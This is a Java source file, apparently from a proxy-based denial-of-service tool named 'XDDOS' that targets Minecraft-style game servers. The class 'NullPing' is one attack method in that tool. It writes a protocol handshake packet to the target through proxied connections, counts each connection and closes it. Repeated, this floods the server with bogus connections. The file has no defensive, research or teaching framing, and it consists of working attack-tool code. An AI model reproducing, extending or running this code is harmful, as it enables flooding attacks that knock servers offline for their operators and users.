package XD.XDDOS.methods;

import XD.XDDOS.XDDOS;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;




public class NullPing
  implements Method
{
  private Handshake handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 69);
  private byte[] bytes = this.handshake.getWrappedPacket();

  
  public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
    while ((paramInt & 0xFFFFFF80) != 0) {
      out.writeByte(paramInt & 0x7F | 0x80);
      paramInt >>>= 7;
    } 
    
    out.writeByte(paramInt);
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
